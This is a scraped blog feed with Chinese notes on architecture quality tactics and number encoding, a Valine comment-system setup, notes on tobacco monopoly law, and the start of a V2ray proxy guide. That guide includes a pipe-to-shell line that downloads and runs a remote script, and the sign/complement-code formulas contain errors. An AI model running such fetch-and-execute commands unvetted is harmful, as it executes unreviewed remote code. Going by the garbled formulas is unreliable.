&emsp;&emsp;主动冗余（热重启、热备份）：所有的冗余构件都以并行的方式对事件做出响应。它们都处在相同的状态，但仅使用一个构件的响应，丢弃其余构件的响应。错误发生时通过切换的方式使用另一个构件的响应。被动冗余（暧重启/双冗余/三冗余）：一个构件（主构件）对事件做出响应，并通知其他构件（备用的）必须进行的状态更新（同步）。当错误发生时，备用构件从最新同步点接替主构件的工作。  &emsp;&emsp;备件：备件是计算平台配置用于更换各种不同的故障构件。  &emsp;&emsp;状态再同步：主动和被动冗余战术要求所恢复的构件在重新提供服务前更新其状态。更新方法取决于可以承受的停机时间、更新的规模及更新的内容多少。  &emsp;&emsp;检查点/回滚：检查点就是使状态一致的同步点，它或者是定期进行，或者是对具体事件做出响应。当在两检查点之间发生故障时，则以这个一致状态的检查点（有快照）和之后发生的事务日志来恢复系统（数据库中常使用）。3. 错误预防  &emsp;&emsp;从服务中删除：如删除进程再重新启动，以防止内存泄露导致故障的发生。  &emsp;&emsp;事务：使用事务来保证数据的一致性，即几个相关密切的步骤，要么全成功，要么都不成功。  &emsp;&emsp;进程监视器：通过监视进程来处理进程的错误。#### 2．可修改性及其实现战术##### 1. 可修改性的描述&emsp;&emsp;可修改性的描述如下表所示。|场景的部分|可能的值||-|-||刺激源|最终用户、开发人员、系统管理员||刺激|增加/删除/修改/改变：功能、质量属性、容量||制品|用户界面、平台、环境或关联系统||环境|运行时、编译时、构建时、设计时||响应|查找要修改的位置，进行修改（不影响其他功能），进行测试，部署所修改的内容||响应度量|对修改的成本进行度量，对修改的影响进行度量|##### 2. 可修改性战术  &emsp;&emsp;包括局部化修改、防止连锁反应、推迟绑定时间。1. 局部化修改  &emsp;&emsp;在设计期间为模块分配责任，以便把预期的变更限制在一定的范围内，从而降低修改的成本。  &emsp;&emsp;维持语义的一致性：语义的一致性指的是模块中责任之间的关系，使这些责任能够协同工作，不需要过多地依赖其他模块。耦合和内聚指标反映一致性，应该根据一组预期的变更来度量语义一致性。使用“抽象通用服务”（如应用框架的使用和其他中间软件的使用）来支持可修改性是其子战术。  &emsp;&emsp;预期期望的变更：通过对变更的预估，进行预设、准备，从而使变更的影响最小。  &emsp;&emsp;泛化该模块：使一个模块更通用、更广泛的功能。  &emsp;&emsp;限制可能的选择：如在更换某一模块（如处理器）时，限制为相同家族的成员。  2. 防止连锁反应  &emsp;&emsp;由于模块之间有各种依赖性，因此，修改会产生连锁反应。防止连锁反应的战术如下。  &emsp;&emsp;信息隐藏：就是把某个实体的责任分解为更小的部分，并选择哪些信息成为公有的，哪些成为私有的，通过接口获得公有责任。  &emsp;&emsp;维持现有的接口：尽可能维持现有接口的稳定性。例如通过添加接口（通过新的接口提供新的服务）可以达到这一目的。  &emsp;&emsp;限制通信路径：限制与一个给定的模块共享数据的模块。这样可以减少由于数据产生/使用引入的连锁反应。  &emsp;&emsp;仲裁者的使用：在具有依赖关系的两个模块之间插入一个仲裁者，以管理与该依赖相关的活动。仲裁者有很多种类型，例如：桥、调停者、代理等就是可以提供把服务的语法从一种形式转换为另一种形式的仲裁者。3.  推迟绑定时间  &emsp;&emsp;系统具备在运行时进行绑定并允许非开发人员进行修改（配置）。  &emsp;&emsp;运行时注册：支持即插即用。  &emsp;&emsp;配置文件：在启动时设置参数。  &emsp;&emsp;多态：在方法调用的后期绑定。  &emsp;&emsp;构件更换：允许载入时绑定。  #### 3．性能及其实现战术##### 1. 性能的描述  &emsp;&emsp;性能描述如下表所示。|场景的部分|可能的值||-|-||刺激源|系统内部或外部||刺激|定期事件、随机事件、偶然事件||制品|系统||环境|正常模式、超载模式||响应|处理刺激、改变服务级别||响应度量|度量等待、期限、吞吐量、缺失率、数据丢失等|##### 2. 性能战术  &emsp;&emsp;性能与时间相关，影响事件的响应时间有两个基本因素。  &emsp;&emsp;资源消耗：事件到达后进入一系列的处理程序，每一步处理都要占用资源，而且在处理过程中消息在各构件之间转换，这些转换也需要占用资源。  &emsp;&emsp;闭锁时间：指对事件处理时碰到了资源争用、资源不可用或对其他计算的依赖等情况，就产生了等待时间。  &emsp;&emsp;性能的战术有如下几种。1. 资源需求  &emsp;&emsp;减少处理事件流所需的资源：提高计算效率（如改进算法）、减少计算开销（如在可修改性与性能之间权衡，减少不必要的代理构件）。  &emsp;&emsp;减少所处理事件的数量：管理事件率、控制采样频率。  &emsp;&emsp;控制资源的使用：限制执行时间（如减少迭代次数）、限制队列大小。2. 资源管理  &emsp;&emsp;引入并发：引入并发对负载平衡很重要。  &emsp;&emsp;维持数据或计算的多个副本：C/S 结构中客户机 C 就是计算的副本，它能减少服务器计算的压力；高速缓存可以存放数据副本（在不同速度的存储库之间的缓冲）。  &emsp;&emsp;增加可用资源：在成本允许时，尽量使用速度更快的处理器、内存和网络。  3. 资源仲裁  &emsp;&emsp;资源仲裁战术是通过如下调度策略来实现的：  &emsp;&emsp;先进/先出（FIFO）；   &emsp;&emsp;固定优先级调度：先给事件分配特定的优先级，再按优先级高低顺序分配资源；  &emsp;&emsp;动态优先级调度：轮转调度、时限时间最早优先；  &emsp;&emsp;静态调度：可以离线确定调度。#### 4．安全性及其实现战术##### 1. 安全性的描述&emsp;&emsp;安全性的描述如下表所示。|场景的部分|可能的值||-|-||刺激源|对敏感资源进行访问的人或系统（合法的、非法的）||刺激|试图：显示数据、改变/删除数据、访问系统服务、降低系统服务的可用性||制品|系统服务、系统中的数据||环境|在线或离线、联网或断网、有或无防火墙||响应|对用户身份验证、阻止或允许对数据或服务的访问、授予可回收访问权、加密信息、限制服务的可用性、通知用户或系统||响应度量|增加安全性的成本、检测或确定攻击的可能性、降低服务级别后的成功率、恢复数据/服务|##### 2. 安全性战术  &emsp;&emsp;包括抵抗攻击、检测攻击和从攻击中恢复。1. 抵抗攻击  &emsp;&emsp;对用户进行身份验证：包括动态密码、一次性密码、数字证书及生物识别等；  &emsp;&emsp;对用户进行授权：即对用户的访问进行控制管理；  &emsp;&emsp;维护数据的机密性：一般通过对数据和通信链路进行加密来实现；  &emsp;&emsp;维护完整性：对数据添加校验或哈希值；  &emsp;&emsp;限制暴露的信息；  &emsp;&emsp;限制访问：如用防火墙、DMZ 策略。  2. 检测攻击  &emsp;&emsp;一般通过“入侵检测”系统进行过滤、比较通信模式与历史基线等方法。3. 从攻击中恢复  &emsp;&emsp;恢复：与可用性中的战术相同；  &emsp;&emsp;识别攻击者：作为审计追踪，用于预防性或惩罚性目的。#### 5．可测试性及其实现战术##### 1. 可测试性的描述 &emsp;&emsp;可测试性的描述如下表所示。|场景的部分|可能的值||-|-||刺激源|各类测试人员（单元测试、集成测试、验收、用户）||刺激|一种测试||制品|设计、代码段、完整的应用||环境|设计时、开发时、编译时、部署时||响应|提供测试的状态值、测试环境与案例的准备||响应度量|测试成本、出现故障的概率、执行时间等|##### 2. 可测试性战术  &emsp;&emsp;包括输入/输出和内部监控。1. 输入/输出  &emsp;&emsp;记录/回放：指捕获跨接口的信息，并将其作为测试专用软件的输入；  &emsp;&emsp;将接口与实现分离：允许使用实现的替代（模拟器）来支持各种测试目的；  &emsp;&emsp;优化访问线路/接口：用测试工具来捕获或赋予构件的变量值。  2. 内部监控  &emsp;&emsp;当监视器处于激活状态时，记录事件（如通过接口的信息）。#### 6．易用性及其实现战术##### 1. 易用性的描述&emsp;&emsp;易用性的描述如下表所示。|场景的部分|可能的值||-|-||刺激源|最终用户||刺激|学习系统特性、有效使用系统、使错误的影响最低、适配系统、对系统满意||制品|系统||环境|运行时或配置时||响应|支持“学习系统特性”的相应：界面为用户所熟悉或使用帮助系统<br>支持“有效使用系统”的相应：数据/命令聚合或复用、界面是导航、操作的一致性、多个活动同时进行<br>支持“使错误的影响最低”的相应：撤销/取消、从故障中恢复、<br>支持“适配系统”的相应：界面为用户所熟悉或使用帮助系统<br>支持“对系统满意”的相应：界面为用户所熟悉或使用帮助系统||响应度量|测试成本、出现故障的概率、执行时间等|##### 2. 易用性战术  &emsp;&emsp;包括运行时战术、设计时战术和支持用户主动操作。1. 运行时战术  &emsp;&emsp;任务的模型：维护任务的信息，使系统了解用户试图做什么，并提供各种协助；  &emsp;&emsp;用户的模型：维护用户的信息，例如使系统以用户可以阅读页面的速度滚动页面；  &emsp;&emsp;系统的模型：维护系统的信息，它确定了期望的系统行为，并向用户提供反馈。  2. 设计时战术  &emsp;&emsp;将用户接口与应用的其余部分分离开来，预计用户接口会频繁发生变化，因此，单独维护用户接口代码将实现变更局部化。这与可修改性相关。3. 支持用户主动操作  &emsp;&emsp;支持用户的主动操作，如支持“取消”、“撤销”、“聚合”和 “显示多个视图”。### 1.1.3 数据表示1. 原码  如果机器字长为n，那么原码的定义如下：  若X是纯整数，则当X是非负数时原码即为X，当X是负数是原码为2^(n-1) + |X|。  若X是纯小数，则当X是非负数时原码即为X，当X是负数时原码为2^0 + |X|。  `负数首位为1`2. 反码如果机器字长为n，那么反码的定义如下：  若X是纯整数，则当X是非负数时原码即为X，当X是负数是原码为2^n - 1 + |X|。  若X是纯小数，则当X是非负数时原码即为X，当X是负数时原码为2-2^-(n-1) + |X|。  `负数按位取反`3. 补码如果机器字长为n，那么补码的定义如下：  若X是纯整数，则当X是非负数时原码即为X，当X是负数是原码为2^n + |X|。  若X是纯小数，则当X是非负数时原码即为X，当X是负数时原码为2 + |X|。 `负数按位取反+1`4. 移码在机器字长为n，偏移量为2^(n-1)的情况下，纯整数的移码为2^(n-1)+X,纯小数的移码为1+X。`补码符号位取反即可得到移码`  ### 1.1.4 校验码计算机通常使用校验码的方法来检测传送的数据是否出问题。  `码距`:一个编码系统中任意两个合法编码之间至少有多少个二进制位不同  1. 奇偶校验码  通过在编码中增加一位校验位来使编码中1的个数为奇数（奇校验）或者偶数（偶校验），从而使码距变为2。  常见的有：`水平奇偶校验码`，`垂直奇偶校验码`，`水平垂直校验码`2. 海明码海明码利用奇偶性来检错和纠错。在数据位之间的特定位置上插入K个校验位，通过扩大码距来实现检错和纠错。3. 循环冗余校验码利用多项式为K个数据位产生R个校验位，编码长度K+R记为N，N为CRC码的字长，又称为(n,k)码。    --> -->]]></content>
    
    
      
      
    <summary type="html">&lt;!-- # 第一章 绪论
## 1.1 系统架构的概念及其发展历史
### 1.1.1 系统架构的概念
&amp;emsp;&amp;emsp;软件架构是关于软件系统的结构、行为和属性的高级抽象。在描述阶段，其对象是直接构成系统的抽象组件以及各个组件之间的连接规则，特别是相对细致的描述组件之间</summary>
      
    
    
    
    <category term="读书笔记" scheme="https://coder.lufer.cc/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="读书笔记" scheme="https://coder.lufer.cc/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>使用Valine作为Hexo评论系统并修复目前存在的问题</title>
    <link href="https://coder.lufer.cc/Hexo/%E4%BD%BF%E7%94%A8Valine%E4%BD%9C%E4%B8%BAHexo%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E5%B9%B6%E4%BF%AE%E5%A4%8D%E7%9B%AE%E5%89%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>https://coder.lufer.cc/Hexo/%E4%BD%BF%E7%94%A8Valine%E4%BD%9C%E4%B8%BAHexo%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E5%B9%B6%E4%BF%AE%E5%A4%8D%E7%9B%AE%E5%89%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98/</id>
    <published>2020-12-21T01:41:27.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="何为valine"><a class="markdownIt-Anchor" href="#何为valine"></a> 何为Valine</h1><p>  既然大家已经使用了Gitpage+Hexo这种搭配，自然是想要在无需架设服务器的情况下完美运行自己的博客，那么如何建设一个评论系统也值得摸索。</p><p>  目前常见的博客评论系统有：</p><ul><li><s>Disqus</s> 被墙</li><li><s>来必力</s> 无法访问</li><li>Gitment</li><li>Gitalk</li><li>Valine</li></ul><p>  Gitment和Gitalk都是基于Github Issue的评论系统，我之前在用的是Gitalk，但是基于Github有两个缺点，一个是每篇文章一定要点进去才可以初始化Issue，另一个是只有用Github账号登录之后才能评论。</p><p>  虽说也有无需登录的解决方案，但是一方面其原理还是用自己的账号来发布匿名评论，另一方面需要后端服务器支持，这与无后的初衷相背离。</p><p>  所以最后我选了Valine。</p><p>  Valine作为一款快速、简洁且高效的<s>无后端</s>评论系统。其实还是要后端的，不过是架设在Leancloud上的，使用免费版就够用了。</p><p>LeanCloud的免费版目前每天强制休眠6小时，但是休眠只影响邮件通知功能，评论功能还可以正常使用。邮件的话在唤醒后自动检查一遍重发即可。</p><p>  为了便于管理评论，更是处于想要邮件提醒这个功能，我使用了Valine-Admin（以下简称VA），项目地址如下</p><blockquote><p><a href="https://github.com/DesertsP/Valine-Admin">https://github.com/DesertsP/Valine-Admin</a></p></blockquote><h1 id="配置valine"><a class="markdownIt-Anchor" href="#配置valine"></a> 配置Valine</h1><h2 id="账号注册及配置"><a class="markdownIt-Anchor" href="#账号注册及配置"></a> 账号注册及配置</h2><p>  建议注册国际版，目前国内版已经强制备案了，网址：</p><blockquote><p><a href="https://leancloud.app/">https://leancloud.app/</a></p></blockquote><p>  注册之后创建应用，选择开发版即可。</p><p>  随后进入应用，点击<code>云引擎-设置</code>，先添加环境变量，按照VA的Github页面说明填写即可。</p><p>  配置完以后切换到<code>云引擎-部署</code>，部署模式选择<code>部署项目-Git部署</code>，分支<code>master</code>，手动部署目标环境为<code>生产环境</code>在Leancloud云引擎设置界面，填写代码库并保存：</p><blockquote><p><a href="https://github.com/DesertsP/Valine-Admin.git">https://github.com/DesertsP/Valine-Admin.git</a></p></blockquote><p>  即可一键部署。</p><p>  此外最好再绑定独立域名，便于后续访问管理。</p><h1 id="修复bug"><a class="markdownIt-Anchor" href="#修复bug"></a> 修复BUG</h1><p>  在搭建测试过程中，发现了一些比较影响使用的BUG，记录如下。</p><h2 id="邮件中无法点击链接"><a class="markdownIt-Anchor" href="#邮件中无法点击链接"></a> 邮件中无法点击链接</h2><p>  在收到回复邮件的时候，邮件中的蓝色链接部分无法点击。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rwPH1J.png" alt="" /></p><p>  原因是在邮件的HTML代码中，herf标签没有带HTTP头，把代码中的链接部分根据实际需要添加HTTP或者HTTPS即可，示例如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">您在<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none;color: #ffffff;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;$&#123;SITE_URL&#125;&quot;</span>&gt;</span> $&#123;SITE_NAME&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span>上的留言有新回复啦！<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin:40px auto;width:90%&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  改为</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">您在<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none;color: #ffffff;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://$&#123;SITE_URL&#125;&quot;</span>&gt;</span> $&#123;SITE_NAME&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span>上的留言有新回复啦！<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin:40px auto;width:90%&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="leancloud被限流"><a class="markdownIt-Anchor" href="#leancloud被限流"></a> LeanCloud被限流</h2><p>  LeanCloud的目前由于官方采取限流措施，在休眠之后就无法通过自动任务来唤醒了。</p><p>  官方的公告如图</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rwFDzQ.png" alt="" /></p><p>  在休眠后LeanCloud会在试图唤醒时报错。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rwklT0.png" alt="" /></p><p>  这里我采用了Flexiston的方案，链接如下</p><blockquote><p><a href="https://blog.flesx.cn/posts/25909.html">https://blog.flesx.cn/posts/25909.html</a></p></blockquote><p>  主要原理是利用Github Action自动访问管理网页来通过外部唤醒LeanCloud，唤醒之后自动任务就可以继续执行了。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rwABuj.png" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;何为valine&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#何为valine&quot;&gt;&lt;/a&gt; 何为Valine&lt;/h1&gt;
&lt;p&gt;  既然大家已经使用了Gitpage+Hexo这种搭配，自然是想要在无需架设服务器的情况下完美运行自己的博客</summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Github" scheme="https://coder.lufer.cc/tags/Github/"/>
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>烟草专卖法</title>
    <link href="https://coder.lufer.cc/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/%E7%83%9F%E8%8D%89%E4%B8%93%E5%8D%96%E6%B3%95/"/>
    <id>https://coder.lufer.cc/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/%E7%83%9F%E8%8D%89%E4%B8%93%E5%8D%96%E6%B3%95/</id>
    <published>2020-12-17T06:54:13.000Z</published>
    <updated>2021-04-06T02:15:37.619Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-烟草专卖"><a class="markdownIt-Anchor" href="#一-烟草专卖"></a> 一、烟草专卖</h1><h2 id="1-专卖管理中的烟草"><a class="markdownIt-Anchor" href="#1-专卖管理中的烟草"></a> 1、专卖管理中的烟草</h2><p>  专卖管理中的<code>烟草</code>并不是植物学的概念，而是对于<code>烟草专卖品</code>的简称，主要包括<code>卷烟，雪茄烟，烟丝，复烤烟叶，烟叶，卷烟纸，滤嘴棒，烟用丝束和烟草专用机械</code></p><ol><li>卷烟<br />是指用各种烟叶均匀混合切成烟丝，以卷烟纸卷制而成的烟草制品。</li><li>雪茄烟<br />是指用晾晒烟叶或烟草薄片为包皮或各种棕色卷烟纸卷制的，烟芯以晾晒烟为主的，具有雪茄香味的烟草制品。</li><li>烟丝<br />是指用烟叶、复烤烟叶、烟草薄片为原料加工而成的丝、末、粒状商品。</li><li>复烤烟叶<br />是指初烤后再进行烤制的烟叶。</li><li>烟叶<br />是指生产烟草制品所需的烤烟和名晾晒烟，名晾晒烟名录由<code>国务院烟草专卖行政主管部门</code>制订。</li><li>卷烟纸<br />是指用植物纤维或其他无毒化学纤维制造成的，用以制造卷烟的纸制品。</li><li>滤嘴棒<br />是指用烟用丝束等材料制成的，用以接装在卷烟上形成滤嘴卷烟的圆形棒制品。</li><li>烟用丝束<br />是指使用无毒的化学纤维、合成纤维或其他无毒的、具有过滤性能的物质制成的，用以制造滤嘴棒的束状纤维制品。</li><li>烟草专用机械<br />是指烟草及制品在生产加工过程中的专门生产、试验、检测设备的总称，含整机及28种特定部件。</li></ol><h2 id="2-专卖的概念"><a class="markdownIt-Anchor" href="#2-专卖的概念"></a> 2、专卖的概念</h2><p>  我国烟草实行的专卖是完全专卖，是指在全国范围内对专卖品产供销各环节都实行专卖管理。</p><h1 id="二-我国烟草专卖制度"><a class="markdownIt-Anchor" href="#二-我国烟草专卖制度"></a> 二、我国烟草专卖制度</h1><h2 id="1-烟草专卖制度的确立和发展"><a class="markdownIt-Anchor" href="#1-烟草专卖制度的确立和发展"></a> 1、烟草专卖制度的确立和发展</h2><ol><li><code>1981年5月18日</code>国务院决定成立烟草总公司。</li><li><code>1982年1月1日</code>中国烟草总公司正式挂牌，宣告成立。</li><li>从<code>1983年1月1日</code>起，全国烟叶收购、卷烟生产、卷烟调拨、卷烟销售业务和进出口业务均由中国烟草总公司管理，并于1983年成立国家烟草专卖局。</li><li><code>1983年9月23日</code>国务院发布了《中华人民共和国烟草专卖条例》，于<code>1983年11月1日</code>起正式实施。</li><li><code>1984年9月10日</code>国家烟草专卖局发布《&lt;烟草专卖条例&gt;实施细则》。</li><li><code>1991年6月29日</code>通过了《烟草专卖法》，于<code>1992年1月1日</code>正式施行。</li><li><code>1997年7月3日</code>国务院颁布施行《中华人民共和国烟草专卖法实施条例》。</li></ol><h1 id="三-烟草专卖许可证"><a class="markdownIt-Anchor" href="#三-烟草专卖许可证"></a> 三、烟草专卖许可证</h1><h2 id="1-烟草专卖许可证"><a class="markdownIt-Anchor" href="#1-烟草专卖许可证"></a> 1、烟草专卖许可证</h2><p>  烟草专卖许可证是<code>国家烟草专卖行政主管部门</code>颁发的准许特定公民、法人和其他组织从事有关烟草专卖品的生产、经营等活动的证明文书。《烟草专卖许可证管理办法》于<code>2007年3月7日</code>颁布施行。</p><h2 id="2-烟草专卖许可证的种类"><a class="markdownIt-Anchor" href="#2-烟草专卖许可证的种类"></a> 2、烟草专卖许可证的种类</h2><p>  烟草专卖许可证可分为：</p><ol><li>烟草专卖生产企业许可证</li><li>烟草专卖批发企业许可证</li><li>特种烟草专卖经营企业许可证</li><li>烟草专卖零售许可证</li></ol><h2 id="3-烟草专卖许可证的效力"><a class="markdownIt-Anchor" href="#3-烟草专卖许可证的效力"></a> 3、烟草专卖许可证的效力</h2><p>  烟草专卖许可证的法律效力主要可体现在三个方面</p><ol><li>证明力<br />领有烟草专卖许可证的企业和个人凭烟草专卖许可证证明自己享有从事相应烟草专卖品生产、经营活动的权利。</li><li>确定力<br />烟草专卖行政许可决定一经做出就不得随意变更、撤销或撤回。</li><li>约束力<br />一旦取得烟草专卖许可证，被许可人就必须严格依照许可证上载明的事项进行生产或经营，包括经营方式和经营范围。</li></ol><p>  专卖许可证的有效期限最长为<code>5</code>年。</p><h1 id="四-烟叶的种植-收购和调拨"><a class="markdownIt-Anchor" href="#四-烟叶的种植-收购和调拨"></a> 四、烟叶的种植、收购和调拨</h1><h2 id="1-烟叶的种类"><a class="markdownIt-Anchor" href="#1-烟叶的种类"></a> 1、烟叶的种类</h2><p>  我国纳入专卖范围的烟叶主要有烤烟和名晾晒烟两种。</p><h2 id="2-烟叶种植"><a class="markdownIt-Anchor" href="#2-烟叶种植"></a> 2、烟叶种植</h2><p>  烟叶种植计划由<code>国家计划部门</code>下达到有关烟叶种植的省、自治区、直辖市。国务院烟草专卖行政主管部门根据规定与烟叶种植的省、自治区、直辖市人民政府及当地烟草专卖行政主管部门具体落实烟叶种植计划。</p><h3 id="3-烟叶收购"><a class="markdownIt-Anchor" href="#3-烟叶收购"></a> 3、烟叶收购</h3><p>  烟叶收购计划由<code>县级以上</code>地方人民政府计划部门根据国务院计划部门下达的计划下达、其他单位和个人不得变更。<br />  烟草公司或其委托单位应与烟叶种植者签订烟叶收购合同。烟叶收购合同应当约定烟叶种植面积。烟叶收购价格由<code>国务院物价主管部门</code>会同<code>国务院烟草专卖行政主管部门</code>按照分等定价的原则制订。</p><h3 id="4-烟叶调拨"><a class="markdownIt-Anchor" href="#4-烟叶调拨"></a> 4、烟叶调拨</h3><p>  烟叶调拨是指具有烟叶经营权的企业之间，根据国家计划进行的有关烟叶、复烤烟叶方面的购销活动。可分为省际间调拨和省内调拨两种。</p><ol><li>省际间调拨<br />省际间调拨由中国烟草总公司所属中国烟叶购销公司进行，经产区和销区提出调拨计划，由中国烟叶购销公司进行平衡，并经国家烟草专卖局、中国烟草总公司审核后上报国家计委审批。</li><li>省内调拨<br />省内调拨由各省级烟草公司组织省内供需双方提出计划，经省级烟草专卖局报省级计划管理部门审批。</li></ol><h1 id="五-烟草制品的销售"><a class="markdownIt-Anchor" href="#五-烟草制品的销售"></a> 五、烟草制品的销售</h1><h2 id="1-烟草专卖品的市场特点"><a class="markdownIt-Anchor" href="#1-烟草专卖品的市场特点"></a> 1、烟草专卖品的市场特点</h2><ol><li>垄断性<br />我国烟草专卖品施行专卖管理，垄断经营。</li><li>适度性<br />烟草市场既要保证需求，又不大力发展。实行适当满足、适当控制、积极引导的方针。</li><li>复杂性<br />假冒卷烟，走私卷烟屡禁不止，甚至有愈演愈烈之势。</li></ol><h2 id="2-烟草制品的批发与零售"><a class="markdownIt-Anchor" href="#2-烟草制品的批发与零售"></a> 2、烟草制品的批发与零售</h2><p>  由各地市级烟草公司进行统一供货，统一配送，入网销售。</p><p>  无烟草专卖批发企业许可证的单位或者个人，一次销售卷烟、雪茄烟<code>50条</code>以上的，视为无烟草专卖批发企业许可证从事烟草制品批发业务。</p><h1 id="六-烟草制品的运输"><a class="markdownIt-Anchor" href="#六-烟草制品的运输"></a> 六、烟草制品的运输</h1><h2 id="1-烟草专卖品运输管理的方法"><a class="markdownIt-Anchor" href="#1-烟草专卖品运输管理的方法"></a> 1、烟草专卖品运输管理的方法</h2><p>  托运或自运烟草专卖品的，必须持有烟草专卖行政主管部门或者烟草专卖行政主管部门授权的机构签发的准运证。</p><p>   邮寄卷烟、雪茄烟每件以<code>2条(400支)</code>为限(两者合寄亦限两条)，邮寄烟叶、烟丝每件以<code>5公斤</code>为限(两者合寄不得超过10公斤)。每人每次限寄一件，不准多件邮寄。</p><p>  个人乘坐车、船、飞机等交通工具，跨地市携带卷烟的最高限量为每人次<code>1万支(50条)</code>。</p><h2 id="2-烟草专卖品准运证管理"><a class="markdownIt-Anchor" href="#2-烟草专卖品准运证管理"></a> 2、烟草专卖品准运证管理</h2><p>  烟草专卖品准运证的有效期限公路运输不得超过<code>20天</code>，其他运输方式最长不得超过<code>30天</code>，而且在有效期限内只能使用一次。烟草专卖品准运证在运输过程中必须随货同行。在运输<code>烟叶、复烤烟叶、卷烟</code>过程中，鉴章的购销合同原件也需随货同行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-烟草专卖&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-烟草专卖&quot;&gt;&lt;/a&gt; 一、烟草专卖&lt;/h1&gt;
&lt;h2 id=&quot;1-专卖管理中的烟草&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-专卖管理中</summary>
      
    
    
    
    <category term="烟草知识" scheme="https://coder.lufer.cc/categories/%E7%83%9F%E8%8D%89%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="烟草知识" scheme="https://coder.lufer.cc/tags/%E7%83%9F%E8%8D%89%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>V2ray+TLS+Websocket搭建指南</title>
    <link href="https://coder.lufer.cc/Linux/V2ray-TLS-Websocket%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/"/>
    <id>https://coder.lufer.cc/Linux/V2ray-TLS-Websocket%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</id>
    <published>2020-02-25T08:40:34.000Z</published>
    <updated>2021-04-06T02:18:44.773Z</updated>
    
    <content type="html"><![CDATA[<p>  参考  <a href="https://www.conum.cn/share/191.html">基于v2ray的websocket+tls+web实现安全网络代理</a></p><h1 id="v2ray安装"><a class="markdownIt-Anchor" href="#v2ray安装"></a> V2ray安装</h1><h2 id="安装v2ray主程序"><a class="markdownIt-Anchor" href="#安装v2ray主程序"></a> 安装V2ray主程序</h2><p>  一键脚本安装。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br></pre></td></tr></table></figure><h2 id="修改配置文件"><a class="markdownIt-Anchor" href="#修改配置文件"></a> 修改配置文件</h2><p>  使用脚本安装完成后，需要完成配置文件的修改，脚本安装后的配置文件存放位置为<code>/etc/v2ray/config.json</code>。具体配置文件如下：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;inbound&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;port&quot;</span>: <span class="number">1028</span>,</span><br><span class="line"><span class="attr">&quot;listen&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>, <span class="comment">//只监听 127.0.0.1，避免除本机外的机器探测到开放了 1028 端口</span></span><br><span class="line"><span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;vmess&quot;</span>,  <span class="comment">//使用vmess协议</span></span><br><span class="line"><span class="attr">&quot;settings&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;clients&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line"><span class="attr">&quot;id&quot;</span>: <span class="string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span>, <span class="comment">//可在https://www.uuidgenerator.net/生成UUID</span></span><br><span class="line"><span class="attr">&quot;alterId&quot;</span>: <span class="number">64</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br><span class="line">    <span class="attr">&quot;streamSettings&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;network&quot;</span>: <span class="string">&quot;ws&quot;</span>, <span class="comment">//使用websocket协议作为传输协议</span></span><br><span class="line"><span class="attr">&quot;wsSettings&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;path&quot;</span>: <span class="string">&quot;/v2ray&quot;</span> <span class="comment">//WebSocket所使用的HTTP协议路径</span></span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;outbound&quot;</span>: &#123;</span><br><span class="line">        